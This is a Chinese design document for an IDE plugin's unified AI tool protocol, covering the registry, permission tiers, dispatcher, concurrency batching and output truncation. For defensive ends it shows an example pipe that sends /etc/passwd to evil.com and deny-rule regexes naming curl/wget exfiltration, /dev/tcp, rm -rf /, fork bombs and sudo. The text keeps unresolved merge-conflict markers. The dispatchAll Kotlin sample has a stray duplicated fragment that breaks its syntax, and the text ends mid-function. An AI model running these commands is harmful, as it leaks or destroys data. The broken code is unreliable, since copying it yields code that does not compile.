# CodePlanGUI 统一工具协议系统 — 设计文档

<<<<<<< Updated upstream
> **版本**: v3.0
=======
> **版本**: v3.3
>>>>>>> Stashed changes
> **日期**: 2026-04-20
> **状态**: Draft
> **前置依赖**: Phase 1（统一事件通道 `onEvent`）已完成；Phase 2（消息分组 `MessageGroup`）已完成
> **参考**: MiniCode PRD_UNIFIED_TOOL_PROTOCOL.md、claw-code 权限模型调研
<<<<<<< Updated upstream
> **变更**: v2.0 → v3.0 适配统一事件通道（`onEvent`）和消息分组（`MessageGroup`）架构
=======
> **变更**: v3.2 → v3.3 代码审查优化（deny_rules 具象化、FileWriteLock 修复、MCP 校验内置、频率限制、Hook 语义明确、新建文件完整预览）；v3.1 → v3.2 动态并发安全、大输出截断、结果保序、Pre/Post Hook、MCP 基础校验；v3.0 → v3.1 代码审查修复（并发模型、超时竞态、职责边界）；v2.0 → v3.0 适配统一事件通道和消息分组架构
>>>>>>> Stashed changes

---

## 1. 背景与目标

### 1.1 现状问题

当前 `run_command` 是唯一工具，相关逻辑分布在以下文件中：

| 层 | 文件 | 职责 |
|----|------|------|
| SSE 解析 | `ToolCallAccumulator.kt` | 累积 tool_call delta |
| SSE 解析 | `SseChunkParser.kt` | 提取 ToolCallDelta |
| API 模型 | `OkHttpSseClient.kt` | ToolDefinition / FunctionDefinition 数据类 |
| 调度 | `ChatService.kt` | 工具定义、权限检查、审批挂起、结果回传（约 120 行硬编码） |
| 执行 | `CommandExecutionService.kt` | ProcessBuilder、超时、输出采集、白名单/路径检查 |
| 结果 | `ExecutionResult.kt` | sealed class（Success/Failed/Blocked/Denied/TimedOut） |
| Bridge | `BridgeHandler.kt` | approval_request / approval_response / execution_status 事件 |
| 前端 | `ApprovalDialog.tsx` | 审批弹框 |
| 前端 | `ExecutionCard.tsx` | 执行状态卡片 |
| 配置 | `PluginSettings.kt` | commandExecutionEnabled / commandWhitelist / commandTimeoutSeconds |

核心问题：新增工具需要修改 `ChatService.kt` 多处，权限逻辑分散，MCP 无法接入。

### 1.2 设计目标

| 目标 | 描述 |
|------|------|
| **解耦** | ChatService 不感知具体工具，只通过统一接口调度 |
| **统一** | 内置工具和 MCP 工具共享注册、权限、执行管线 |
| **安全** | 多层权限策略 + 文件写操作 IDE 原生 diff 审批 + 新建文件确认 |
| **IDE 原生** | 充分压榨 IDE 插件优势——diff 审批用 IntelliJ DiffDialog、搜索用 IDE 索引、改代码后自动 inspection + format、变更在编辑器内联高亮（非 WebView 模拟） |
| **可扩展** | 运行时动态加载/卸载工具（MCP server 上下线） |
| **健壮** | 工具执行永不导致 Agent Loop 崩溃 |
| **并发安全** | 同文件写入操作串行化，防止数据竞争 | |

### 1.3 工具范围

第一版 6 个内置工具 + MCP 工具 + Skills，**统一实现**：

| 分类 | 工具 | 权限 | 用途 |
|------|------|------|------|
| 命令执行 | `run_command` | 动态分级 | Shell 命令（现有，重构） |
| 文件读取 | `read_file` | READ_ONLY | 读取文件内容（支持按行分块） |
| 目录浏览 | `list_files` | READ_ONLY | 列出目录结构 |
| 文本搜索 | `grep_files` | READ_ONLY | 基于 IntelliJ Search API 的文本搜索 |
| 精确替换 | `edit_file` | WORKSPACE_WRITE | 单处/多处文本替换 + diff 审批 |
| 整文件写入 | `write_file` | WORKSPACE_WRITE | 新建或覆写文件 + 确认/diff 审批 |
| MCP 工具 | `mcp__*__*` | 需审批（默认） | 动态加载（见 §10） |
| Skills | `execute_skill` | 安全属性自动放行 | 多步技能编排（见 §11） |

> `web_search`、`web_fetch`、`ask_user` 等工具后续通过 MCP 接入，不纳入第一版。

---

## 2. 架构总览

### 2.1 模块依赖图

```
                          ┌──────────────────────────┐
                          │     ChatService          │
                          │  (SSE 状态机 + Agent Loop)│
                          └────────────┬─────────────┘
                                       │
                      ┌────────────────▼────────────────┐
                      │      ToolCallDispatcher          │
                      │  权限策略 + 审批挂起 + 调度       │
                      └────────────────┬────────────────┘
                                       │
                ┌──────────────────────▼──────────────────────┐
                │               ToolRegistry                   │
                │    注册 · 查找 · 校验 · 能力协商 · 清理     │
                └──┬─────┬─────┬─────┬─────┬────┬────┬───────┘
                   │     │     │     │     │    │    │
                  Bash  Read  List  Grep Edit Write MCP   Skill
                  Exec  File  Files Files File File  (P4)  (P5)
                   │                         │    │      │
                   ▼                         ▼    ▼      ▼
           ┌──────────────┐          ┌──────────────┐  ┌────────────┐
           │ CommandExec  │          │ FileChange   │  │ SkillTool  │
           │ Service      │          │ Review       │  │ (Command   │
           │ (现有，不改) │          │ (diff 审批)  │  │  调度器)   │
           └──────────────┘          └──────────────┘  └────────────┘
```

### 2.2 数据流

```
[1] 用户发送消息
      │
      ▼
[2] ChatService.sendMessage()
      ├─ dispatcher.buildToolsParam() 获取工具列表
      ├─ 构建 API 请求（带 tools 参数）
      └─ 启动 SSE 流
      │
      ▼
[3] SSE 状态机（现有，不变）
      ├─ STREAMING_TEXT → 正常渲染 token
      ├─ ACCUMULATING_TOOL_CALL → ToolCallAccumulator 累积
      └─ WAITING_RESULT → 调用 ToolCallDispatcher
      │
      ▼
[4] ToolCallDispatcher.dispatch()
      ├─ 查找工具 → 不存在则 ToolResult(ok=false)
      ├─ 动态权限解析
      ├─ PermissionPolicy 判定 (DENY / ALLOW / ASK)
      ├─ ASK → Bridge 审批 → 协程挂起
      └─ ALLOW/审批通过 → ToolRegistry.execute()
      │
      ▼
[5] ToolRegistry.execute() — 三层安全
      ├─ 查找失败 → ToolResult(ok=false)
      ├─ 参数校验失败 → ToolResult(ok=false)
      ├─ 执行异常 → ToolResult(ok=false)
      └─ 执行成功 → ToolResult(ok=true, output=...)
      │
      ▼
[6] 结果回传
      ├─ ToolResult → 转为 OpenAI tool_result 格式
      ├─ 追加到消息历史
      └─ 发起下一轮 API 请求
```

### 2.3 实现阶段

| 阶段 | 模块 | 内容 |
|------|------|------|
| M1 | 核心类型 | ToolResult、ToolContext、ToolSpec、PermissionMode、ToolExecutor |
| M2 | 注册中心 | ToolRegistry — 注册、查找、校验、执行、清理 |
| M3 | 内置工具 | 6 个工具的执行器实现 |
| M4 | 集成调度 | ToolCallDispatcher + ChatService 重构 |
| M5 | MCP 接入 | McpConnectionManager + McpToolFactory + 能力协商 + Schema 热更新 |
| M6 | Skills 接入 | SkillRegistry + SkillTool + 懒加载 + 条件激活 |

---

## 3. 核心类型定义（M1）

### 3.1 ToolResult — 统一结果类型

所有工具（内置和 MCP）的返回值遵循同一结构。

| 字段 | 类型 | 必填 | 说明 |
|------|------|------|------|
| `ok` | Boolean | 是 | 成功或失败 |
| `output` | String | 是 | 结果文本；失败时存放可读错误描述。Dispatcher 保证不超过 `MAX_TOOL_OUTPUT_BYTES`（默认 50KB） |
| `awaitUser` | Boolean | 否 | 若为 true，暂停 Agent Loop 等待用户输入 |
| `backgroundTask` | BackgroundTask? | 否 | 后台任务信息（bash 后台命令）。`BackgroundTask { id: String, command: String, status: BackgroundTaskStatus }`。`BackgroundTaskStatus` 枚举值：`PENDING`（等待启动）、`RUNNING`（执行中）、`COMPLETED`（已完成）、`FAILED`（执行失败）、`CANCELLED`（用户取消） |
| `truncated` | Boolean | 否 | 输出是否被截断 |
| `totalBytes` | Int? | 否 | 原始输出总字节数（截断时有值） |
| `outputPath` | String? | 否 | 完整输出持久化到磁盘的路径（截断时有值），模型可用 `read_file` 查看 |

与现有 `ExecutionResult` 的映射：

| ExecutionResult | ToolResult |
|-----------------|------------|
| `Success(stdout, stderr, exitCode, durationMs)` | `{ ok: true, output: stdout + stderr }` |
| `Failed(stdout, stderr, exitCode, durationMs)` | `{ ok: false, output: stderr }` |
| `Blocked(reason)` | `{ ok: false, output: reason }` |
| `Denied(reason)` | `{ ok: false, output: reason }` |
| `TimedOut(stdout, timeoutSeconds)` | `{ ok: false, output: timeout info }` |

**关键约束**：`output` 在 `ok=false` 时必须包含可读的错误描述。

#### 大输出截断策略

工具执行结果可能超过 API 请求大小限制（如 `run_command` 输出 10MB 日志）。Dispatcher 在调用 executor 后执行截断：

```
executor.execute() 返回 ToolResult
  │
  ├─ output.length ≤ MAX_TOOL_OUTPUT_BYTES (50KB)
  │   └─ 直接使用
  │
  └─ output.length > MAX_TOOL_OUTPUT_BYTES
      ├─ 截断 output 为前 50KB，追加截断提示：
      │   "\n\n... [OUTPUT TRUNCATED: {totalBytes} bytes total, showing first 50KB]"
      ├─ 完整输出写入临时文件：{cwd}/.codeplan/tmp/tool-output-{callId}.log
      ├─ truncated = true, totalBytes = 原始大小, outputPath = 临时文件路径
      └─ 模型可用 read_file(outputPath) 查看完整输出
```

截断阈值 `MAX_TOOL_OUTPUT_BYTES` 可通过 Settings 配置（默认 50KB）。临时文件在会话结束时由 `ToolRegistry.dispose()` 清理。

### 3.2 ToolContext — 执行上下文

| 字段 | 类型 | 说明 |
|------|------|------|
| `project` | IntelliJ Project | 用于获取 VFS、CommandExecutionService 等 |
| `cwd` | String | 项目根路径，路径安全检查的基准 |
| `settings` | SettingsState | 用户配置（白名单、超时、权限模式等） |

### 3.3 ToolSpec — 工具注册信息

| 字段 | 类型 | 说明 |
|------|------|------|
| `name` | String | 全局唯一标识（如 `run_command`、`mcp__server__tool`） |
| `description` | String | 告诉模型何时使用此工具 |
| `inputSchema` | JsonObject | JSON Schema 参数定义（发给模型 API 的 tools 参数） |
| `requiredPermission` | PermissionMode | 注册时声明的最低权限等级 |
| `executor` | ToolExecutor | 执行器实例 |

#### 动态能力声明

权限等级（`requiredPermission`）用于安全策略，但不等同于执行能力。例如 `run_command` 的 `requiredPermission` 是动态分级的，但其并发安全性取决于具体命令。因此 ToolSpec 额外提供三个动态方法（参数为解析后的输入）：

| 方法 | 返回 | 说明 |
|------|------|------|
| `isConcurrencySafe(input)` | Boolean | 此输入是否可与其他工具并发执行。只读操作返回 `true`，写入/有副作用操作返回 `false` |
| `isReadOnly(input)` | Boolean | 此输入是否为纯读操作（无副作用） |
| `isDestructive(input)` | Boolean | 此输入是否为破坏性操作（如 `rm`、`git reset --hard`） |

**默认实现**：内置工具按类型提供实现（如 `read_file` 始终返回 `isConcurrencySafe=true`）；MCP 工具默认 `false`（保守策略）。

**与 `requiredPermission` 的关系**：

```
requiredPermission  → 安全层：决定是否需要审批
isConcurrencySafe   → 调度层：决定是否可并发执行
isReadOnly          → 信息层：供 Hook 和日志使用
isDestructive       → 信息层：供 Hook 和日志使用
```

示例：

| 工具 | 输入 | requiredPermission | isConcurrencySafe | isReadOnly | isDestructive |
|------|------|--------------------|-------------------|------------|---------------|
| `run_command` | `cat file.txt` | READ_ONLY | `true` | `true` | `false` |
| `run_command` | `npm install` | WORKSPACE_WRITE | `false` | `false` | `false` |
| `run_command` | `rm -rf build/` | DANGER_FULL_ACCESS | `false` | `false` | `true` |
| `read_file` | `{path: "a.kt"}` | READ_ONLY | `true` | `true` | `false` |
| `edit_file` | `{path: "a.kt", ...}` | WORKSPACE_WRITE | `false` | `false` | `false` |
| `grep_files` | `{pattern: "foo"}` | READ_ONLY | `true` | `true` | `false` |

### 3.4 PermissionMode — 权限等级

| 等级 | 顺序 | 说明 | 适用场景 |
|------|------|------|----------|
| `READ_ONLY` | 0 | 只读操作 | read_file、list_files、grep_files、只读 bash 命令 |
| `WORKSPACE_WRITE` | 1 | 项目内读写 | edit_file、write_file、开发 bash 命令 |
| `DANGER_FULL_ACCESS` | 2 | 任意命令 | 未知 bash 命令、未信任的 MCP 工具 |

等级有序：`READ_ONLY < WORKSPACE_WRITE < DANGER_FULL_ACCESS`。
会话权限模式由用户在 Settings 中配置，默认 `WORKSPACE_WRITE`。

### 3.5 ToolExecutor — 执行器接口

每个工具实现此接口。接收参数和上下文，返回 ToolResult。

**关键约束**：
- 实现方负责参数提取和校验，缺失必填参数时返回 `ToolResult(ok=false)`
- 实现方不应抛出异常（ToolRegistry.execute 会兜底 catch）
- 所有 IO 操作必须在 `Dispatchers.IO` 上执行

---

## 4. ToolRegistry 注册中心（M2）

### 4.1 核心 API

| 方法 | 说明 |
|------|------|
| `list()` | 列出所有已注册工具 |
| `find(name)` | 按名称查找工具，返回 `ToolSpec?` |
| `addTools(specs)` | 去重追加（同名跳过不覆盖） |
| `removeTool(name)` | 移除工具（MCP 下线时调用） |
| `addDisposer(fn)` | 注册清理函数 |
| `dispose()` | 反序调用所有清理函数 |
| `buildOpenAiTools()` | 遍历已注册工具，将每个 `ToolSpec` 的 `name`/`description`/`inputSchema` 转为 OpenAI API 的 `tools` 参数格式（`{ type: "function", function: { name, description, parameters } }`） |

> **变更说明**：原 `execute()` 方法已移至 `ToolCallDispatcher`，Registry 只做注册表。执行的三层安全防护（查找→校验→执行 + try/catch）由 Dispatcher 统一负责。

### 4.2 生命周期管理

ToolRegistry 绑定 IntelliJ Project 生命周期：

| 时机 | 操作 |
|------|------|
| 插件启动 | 注册 6 个内置工具（`addTools`） |
| MCP Server 上线 | 动态注册远程工具（`addTools`），注册清理函数（`addDisposer`） |
| MCP Server 下线 | 移除对应工具（`removeTool`） |
| 插件关闭 / Project 关闭 | 反序调用所有 disposer，清理临时文件和连接 |

注册中心通过 `Disposable` 挂载到 IntelliJ 的 `Project` 实例上，确保 IDE 关闭时自动清理。

### 4.3 去重机制

`addTools` 对已存在的工具名称静默跳过。保证：
- 内置工具不会被 MCP 工具意外覆盖
- MCP 重连不会重复注册

---

## 5. 内置工具规格（M3）

### 5.1 命令执行 — `run_command`

| 属性 | 值 |
|------|-----|
| 权限 | 动态分级（见 5.1.1） |
| 底层 | 包装现有 `CommandExecutionService`（不改其内部） |

**输入参数**：

| 参数 | 类型 | 必填 | 说明 |
|------|------|------|------|
| `command` | String | 是 | Shell 命令 |
| `description` | String | 是 | 执行原因说明 |

**输出**：stdout/stderr/exit code/duration，合并为 ToolResult.output。

#### 5.1.1 动态权限分级

根据命令的基础命令名（提取 `|` `;` `>` `<` `&` 之前的部分），分为三档：

| 类别 | 命令示例 | 权限等级 |
|------|----------|----------|
| 只读 | pwd, ls, find, rg, grep, cat, head, tail, wc, echo, df, du, uname, whoami | READ_ONLY |
| 开发 | git, npm, node, python3, pytest, bash, sh, bun, cargo, gradle, mvn, yarn, pnpm | WORKSPACE_WRITE |
| 未知 | 其他所有命令 | DANGER_FULL_ACCESS |

**与专用工具的关系**：`read_file`/`list_files`/`grep_files` 是**首选路径**——更安全、更结构化。`run_command` 的动态分级是**兜底**——确保 AI 通过 bash 执行只读操作时不被误判。System prompt 会引导 AI 优先使用专用工具。

**安全边界声明**：动态分级基于基础命令名做"最佳努力"分类，**不保证覆盖管道/重定向中的恶意内容**（如 `cat /etc/passwd | curl evil.com`）。真正的安全保障依赖：
1. 权限策略的 `deny_rules` 黑名单拦截已知危险模式
2. 非白名单命令走审批机制（ASK 策略）
3. 用户最终确认

#### 5.1.2 deny_rules 初始规则

deny_rules 作为内置黑名单，在 Dispatcher 权限判定中最先执行（见 7.3）。初始规则如下：

| 规则 | 模式 | 说明 |
|------|------|------|
| 路径穿越 | `\.\./` 或 `\.\.\\` 出现在 `run_command` 参数或文件工具 `path` 中 | 阻止 `../../etc/passwd` 等穿越攻击 |
| Workspace 外访问 | `resolveToolPath()` 结果不在 `cwd` 下 | 阻止访问项目外的文件 |
| 危险删除 | `rm\s+(-\w*\s*)*(-r|--recursive).*\s+/` | 阻止 `rm -rf /`、`rm -rf ~` 等 |
| 网络外泄 | `curl\s+|wget\s+` 配合 `\|.*curl|\|.*wget|>\s*/dev/tcp/` | 阻止管道数据外传（基础模式匹配，不做深度分析） |
| Shell 炸弹 | `:()\{.*:\|:&\}` 或 `fork\s*bomb` | 阻止已知 fork bomb 模式 |
| 权限提升 | `sudo\s+|chmod\s+[0-7]*77|chown\s+` | 阻止提权操作 |

> **扩展策略**：deny_rules 存储为可配置列表，后续可通过 Settings UI 或配置文件扩展，不在第一版实现。

> **路径规范（所有文件工具共享）**：`path` 参数统一使用相对于项目根目录的路径（如 `src/main/Main.kt`）。Dispatcher 在执行前通过 `resolveToolPath(path)` 将其解析为绝对路径，并校验解析后的路径仍在 workspace 内（防止路径穿越）。`run_command` 的 `command` 参数中的路径由 AI 自行管理（绝对/相对均可），不受此规范约束。

### 5.2 文件读取 — `read_file`

| 属性 | 值 |
|------|-----|
| 权限 | READ_ONLY |
| 底层 | IntelliJ VFS (VirtualFileManager) |

**输入参数**：

| 参数 | 类型 | 必填 | 默认值 | 说明 |
|------|------|------|--------|------|
| `path` | String | 是 | — | 相对于项目根的文件路径 |
| `line_number` | Integer | 否 | 1 | 起始行号（1-based） |
| `limit` | Integer | 否 | 500 | 读取行数，上限 1000 |

**输出格式**：

```
FILE: src/main/kotlin/Main.kt
LINES: 1-500
TOTAL_LINES: 1200
TRUNCATED: yes

     1→fun main() {
     2→    println("Hello, World!")
     3→}
...
```

**设计说明**：使用行号而非字符偏移。行号是 AI 理解代码的自然单位，所有主流工具（Claude Code、Aider、Cursor）均采用行号。截断时标记 `TRUNCATED: yes`，提示模型用新 `line_number` 重读。

**二进制文件处理**：读取前检测文件是否为二进制（检查前 8KB 是否包含 NUL 字节）。二进制文件返回 `{ ok: false, output: "Binary file, cannot display: <path> (<size> bytes)" }`。

### 5.3 目录浏览 — `list_files`

| 属性 | 值 |
|------|-----|
| 权限 | READ_ONLY |
| 底层 | IntelliJ VFS |

**输入参数**：

| 参数 | 类型 | 必填 | 默认值 | 说明 |
|------|------|------|--------|------|
| `path` | String | 否 | "." | 相对于项目根的目录路径 |

**输出**：最多 200 条，格式为 `dir name` 或 `file name`。

### 5.4 文本搜索 — `grep_files`

| 属性 | 值 |
|------|-----|
| 权限 | READ_ONLY |
| 底层 | IntelliJ FindInProjectUtil（优先）/ 外部 rg（降级） |

**输入参数**：

| 参数 | 类型 | 必填 | 默认值 | 说明 |
|------|------|------|--------|------|
| `pattern` | String | 是 | — | 搜索模式 |
| `path` | String | 否 | "." | 搜索目录 |

**输出**：匹配行（带行号），最多 50 条。无匹配时返回 `(no matches)`。

**搜索实现策略**：

```
grep_files 执行搜索
  │
  ├─ 优先：IntelliJ FindInProjectUtil
  │   ├─ 跨平台一致，不依赖外部工具
  │   ├─ 可复用 IDE 索引（更快）
  │   └─ 失败时 fallback 到外部命令
  │
  └─ 降级：系统 rg -n --no-heading --max-count 50
      ├─ 无 rg 则降级到 grep -rn
      └─ 通过 CommandExecutionService 执行（内部调用，自动放行）
```

**设计说明**：IDE 插件不应依赖外部工具。`rg` 在 Windows 上可能不存在，macOS 默认也没装。IntelliJ 的 `FindInProjectUtil` 已有成熟的搜索实现，且可复用 IDE 的文件索引加速。

**降级路径权限说明**：`grep_files` 降级到外部 `rg`/`grep` 时，通过 `CommandExecutionService` 内部调用执行。这些命令是只读工具内部发出的确定性命令（固定的 `rg -n --no-heading` 参数），不走审批流程，在 `allow_rules` 中以工具名 `grep_files` 为粒度自动放行。用户不可直接触发降级路径——降级对用户透明。

### 5.5 精确文本替换 — `edit_file`

| 属性 | 值 |
|------|-----|
| 权限 | WORKSPACE_WRITE |
| 底层 | 字符串替换 + IntelliJ WriteAction |
| 审批 | **IDE 原生** — 未信任时弹出 IntelliJ DiffDialog（与 Git diff 同组件）；信任后直接写入 + 编辑器内联高亮（见 §8） |

**输入参数**：

| 参数 | 类型 | 必填 | 默认值 | 说明 |
|------|------|------|--------|------|
| `path` | String | 是 | — | 文件路径 |
| `search` | String | 是 | — | 要查找的文本 |
| `replace` | String | 是 | — | 替换为的文本 |
| `replaceAll` | Boolean | 否 | false | 是否替换所有出现 |
| `line_number` | Integer | 否 | — | 指定匹配的起始行号（1-based），用于消歧多处匹配 |

**行为规则**：

- `search` 在文件中不存在时返回 `ok=false`
- `replaceAll=false` 时，若 `search` 出现多次：
  - 若提供了 `line_number`，替换该行号处的匹配（精确指定）
  - 若未提供 `line_number`，返回 `ok=false` 并列出所有匹配行号（AI 可在下次调用时指定 `line_number`）
- `replaceAll=true` 时使用 `split().join()` 而非正则，避免特殊字符问题
- 所有替换均触发 IDE 原生变更流程（审批或内联高亮，见 §8）

**设计说明**：`replaceAll=false` 时如果有多处匹配，静默替换第一处容易导致错误修改。返回匹配数和行号让 AI 可以在下次调用时指定 `line_number` 定位到精确位置，相比仅要求"更精确的上下文"减少了一轮往返。

### 5.6 整文件写入 — `write_file`

| 属性 | 值 |
|------|-----|
| 权限 | WORKSPACE_WRITE |
| 底层 | IntelliJ WriteAction + VFS |

**输入参数**：

| 参数 | 类型 | 必填 | 说明 |
|------|------|------|------|
| `path` | String | 是 | 文件路径（不存在则新建） |
| `content` | String | 是 | 完整文件内容 |

**审批策略**：

```
write_file 执行写入
  │
  ├─ 路径安全检查：resolveToolPath(path) → 不在 workspace 内则拒绝
  │
  ├─ 文件已存在？
  │   ├─ 是 → 触发 IDE 原生变更流程（与 edit_file 一致，见 §8）
  │   └─ 否（新建文件）→ 触发 IDE 原生新建文件确认（见 §8.3）
  │
  ├─ WriteAction 写入
  │
  └─ 触发 Post-Edit 质量管线（见 §8.5）
```

**设计说明**：所有文件写操作均通过 IDE 原生组件展示——已有文件修改用 IntelliJ DiffDialog（与 Git diff 同一组件），新建文件用 IDE 原生确认对话框。信任模式下直接写入 + 编辑器内联高亮 + Ctrl+Z 可撤销。

---

## 6. 并发调度策略

### 6.1 问题

AI 一次返回多个 tool_call 时需要决定并发/串行执行策略：
1. 并发写入同一文件会丢失修改
2. 有隐式依赖的命令（如 `mkdir` 失败后 `touch` 无意义）应级联取消
3. 结果需要保持原始顺序，让模型理解因果关系

### 6.2 解决方案：动态分区 + 文件锁

#### 6.2.1 分区策略

利用 ToolSpec 的 `isConcurrencySafe(input)` 动态方法，将 tool_call 序列分区：

```
AI 返回: [read_file(A), grep_files("foo"), edit_file(B), edit_file(A), read_file(C)]
                 ↓ 动态判断
分区结果:
  Batch 1: [read_file(A), grep_files("foo")]  ← 连续的 isConcurrencySafe=true，并发
  Batch 2: [edit_file(B)]                      ← isConcurrencySafe=false，串行
  Batch 3: [edit_file(A)]                      ← 同上
  Batch 4: [read_file(C)]                      ← 单个安全操作，等效并发
```

规则：
- **连续的** `isConcurrencySafe=true` 的工具合并为一个并发批次
- 任何 `isConcurrencySafe=false` 的工具独占一个批次
- 批次之间**严格串行**（前一批全部完成才启动下一批）
- 批次内结果按**原始 tool_call 顺序**交付（并发执行但有序输出）

#### 6.2.2 文件级写锁

同文件写入操作通过文件锁串行化：

```kotlin
class FileWriteLock {
    private val locks = ConcurrentHashMap<String, Mutex>()

    suspend fun <T> withFileLock(path: String, block: suspend () -> T): T {
        val mutex = locks.computeIfAbsent(path) { Mutex() }
        return mutex.withLock {
            block()
        }
        // 注意：不在此处清理 locks Map 中的 entry。
        // 原因：withLock 释放后 isLocked=false，但另一个协程可能正等待同一把锁，
        // 此时移除会导致 computeIfAbsent 创建新 Mutex，破坏串行化语义。
        // locks Map 大小受限于项目中文件数量（通常 < 10K），不构成内存问题。
    }
}
```

写锁在 Dispatcher 执行写入类工具时自动持有。同一批次内不会有多个非并发安全工具（分区策略保证），因此不会出现死锁。locks Map 在 `ToolRegistry.dispose()` 时整体清理。

#### 6.2.3 错误级联策略

```
Batch 内某工具执行失败
  │
  ├─ 只读工具失败 → 不级联，其他工具继续执行
  │   原因：read/grep 等操作相互独立，一个失败不影响其他
  │
  └─ run_command 失败 → 级联取消同 Batch 内剩余的 run_command
      原因：Bash 命令常有隐式依赖链（如 mkdir 失败 → 后续命令无意义）
      实现：设置 hasBashError 标记，后续 run_command 返回合成错误
```

非 `run_command` 的写入工具（`edit_file`、`write_file`）失败不级联——文件修改是独立操作。

### 6.3 调度流程

```
ToolCallDispatcher.dispatchAll(toolCalls)
  │
  ├─ 1. 对每个 tool_call 调用 spec.isConcurrencySafe(input) 动态判定
  │
  ├─ 2. 分区：连续安全工具合并为并发批次，非安全工具独占批次
  │
  ├─ 3. 逐批执行
  │     ├─ 并发批次：所有工具同时启动，结果按原始顺序收集
  │     │   ├─ 失败的 run_command 触发级联取消
  │     │   └─ 全部完成（或取消）后进入下一批次
  │     └─ 串行批次：单个工具执行
  │         └─ 写入工具自动持有 FileWriteLock
  │
  └─ 4. 合并所有批次结果，按原始 tool_call 顺序排列，回传 API
```

### 6.4 限制

- 文件锁仅保护同一会话内的并发写入
- 跨会话的并发写入依赖 IDE 自身的文件系统锁（VFS）
- MCP 工具默认 `isConcurrencySafe=false`，保守串行执行
- 单个工具只允许操作一个文件路径（防止多文件操作导致死锁）

### 6.5 工具调用频率限制

防止 AI 无限循环调用工具（模型 bug 或 prompt 注入导致）：

| 限制维度 | 阈值 | 说明 |
|----------|------|------|
| 单轮 Agent Loop 最大 tool_call 数 | 20 | 超出后终止 Agent Loop，返回错误信息 |
| 单次 API 响应最大 tool_call 数 | 10 | OpenAI API 级限制，超出拒绝执行并返回错误 |
| 同一工具连续调用次数 | 5 | 同一工具连续调用 5 次后追加警告提示，不阻断 |

```kotlin
// 在 ToolCallDispatcher.dispatchAll() 入口处检查
fun dispatchAll(calls: List<ToolCall>, ...): List<Pair<ToolCall, ToolResult>> {
    if (calls.size > MAX_TOOL_CALLS_PER_RESPONSE) {
        return calls.map { it to ToolResult(ok = false, output = "Too many tool calls in a single response (${calls.size} > $MAX_TOOL_CALLS_PER_RESPONSE)") }
    }
    // ... 正常分区调度
}
```

单轮计数器在 `round_end` 事件后重置。

---

## 7. ToolCallDispatcher 统一调度（M4）

### 7.1 职责边界

**ToolRegistry** 只负责注册/查找/生命周期管理，不执行业务逻辑：

| 方法 | 说明 |
|------|------|
| `list()` / `find()` | 注册和查找 |
| `addTools()` / `removeTool()` | 动态注册/卸载 |
| `addDisposer()` / `dispose()` | 清理 |
| `buildOpenAiTools()` | 转为 API tools 参数格式 |

**ToolCallDispatcher** 负责完整的调度管线：
1. 工具查找（委托 `registry.find()`）
2. 动态权限解析（bash 命令分级）
3. 权限策略判定（deny / allow / ask）
4. 审批挂起（协程挂起 + Bridge 通知）
5. 文件写锁管理
6. 执行（直接调用 `ToolExecutor.execute()`，不再嵌套 `registry.execute()`）
7. 异常兜底（`try/catch` 包裹整个执行过程）

> **变更说明**：原设计中 `registry.execute()` 包含查找 + 校验 + 执行三层，与 Dispatcher 的"查找"逻辑重复。现改为 Dispatcher 持有完整管线，Registry 只做注册表。ToolRegistry 删除 `execute()` 方法。

### 7.2 dispatch 完整流程

```
dispatch(toolName, argsJson, msgId, bridgeHandler)
  │
  ├─ 1. 构建 ToolContext
  │     project, cwd=project.basePath, settings
  │
  ├─ 2. 解析参数
  │     JsonParser.parse(argsJson) → JsonObject
  │     失败 → ToolResult(ok=false, "Invalid arguments")
  │
  ├─ 3. 查找工具
  │     registry.find(toolName)
  │     不存在 → ToolResult(ok=false, "Unknown tool: xxx")
  │
  ├─ 4. 参数校验
  │     必填参数缺失 → ToolResult(ok=false, "Missing required parameter: xxx")
  │
  ├─ 5. 动态权限解析
  │     ├─ run_command → BashExecutor.classifyPermission(command)
  │     │   ├─ 只读命令 (cat, ls, grep...) → READ_ONLY
  │     │   ├─ 开发命令 (git, npm, cargo...) → WORKSPACE_WRITE
  │     │   └─ 未知命令 → DANGER_FULL_ACCESS
  │     └─ 其他工具 → 使用注册的 requiredPermission
  │
  ├─ 6. 权限策略判定 authorize()
  │     │
  │     ├─ deny_rules（内置黑名单）
  │     │   └─ 匹配 → DENY（路径穿越、workspace 外访问）
  │     │
  │     ├─ allow_rules（白名单检查）
  │     │   ├─ run_command: 检查 commandWhitelist
  │     │   │   不在白名单 → DENY
  │     │   └─ 其他工具: 自动放行
  │     │
  │     ├─ session mode 比较
  │     │   sessionMode >= required → ALLOW
  │     │
  │     └─ 兜底 → ASK（弹审批框）
  │
  ├─ 7. 执行
  │     ├─ DENY → ToolResult(ok=false, "Denied by policy")
  │     ├─ ALLOW → fileWriteLock.withFileLock(如需) { executor.execute() }
  │     └─ ASK → requestApproval()
  │         ├─ Bridge.notifyApprovalRequest()
  │         ├─ 协程挂起 awaitApproval()（见 7.4）
  │         ├─ 超时/拒绝 → ToolResult(ok=false)
  │         └─ 用户允许 → fileWriteLock.withFileLock(如需) { executor.execute() }
  │
  ├─ 8. 输出截断（见 3.1 大输出截断策略）
  │     output > MAX_TOOL_OUTPUT_BYTES → 截断 + 持久化到磁盘
  │
  └─ 9. try/catch 兜底：异常 → ToolResult(ok=false, error.message)
```

### 7.2.1 并发调度模型（多 tool_call）

当 SSE 一次返回多个 tool_call 时，ChatService 调用 `dispatchAll()`：

```kotlin
suspend fun dispatchAll(
    calls: List<ToolCall>,
    msgId: String,
    bridgeHandler: BridgeHandler
): List<Pair<ToolCall, ToolResult>> {
    // 结果数组按原始索引存储，保证顺序
    val results = arrayOfNulls<Pair<ToolCall, ToolResult>>(calls.size)

    // 1. 动态分区：isConcurrencySafe(input) 判定每个 tool_call
    val batches = partitionToolCalls(calls)

    // 2. 逐批执行
    for (batch in batches) {
        if (batch.isConcurrencySafe && batch.entries.size > 1) {
            // 并发批次：所有工具同时启动（使用 coroutineScope + async 实现结构化并发）
            val batchResults = coroutineScope {
                batch.entries.map { (index, call) ->
                    async {
                        index to (call to dispatch(call.name, call.arguments, msgId, bridgeHandler))
                    }
                }.awaitAll()
            }
                index to (call to dispatch(call.name, call.arguments, msgId, bridgeHandler))
            }
            // 按原始索引写入结果数组（保持顺序）
            for ((index, result) in batchResults) {
                results[index] = result
            }
        } else {
            // 串行批次：逐个执行
            for ((index, call) in batch.entries) {
                results[index] = call to dispatch(call.name, call.arguments, msgId, bridgeHandler)
            }
        }
    }

    return results.map { it!! }  // 按原始顺序返回
}

data class Batch(val isConcurrencySafe: Boolean, val entries: List<IndexedValue<ToolCall>>)

fun partitionToolCalls(calls: List<ToolCall>): List<Batch> {
    val result = mutableListOf<Batch>()
    for ((index, call) in calls.withIndex()) {
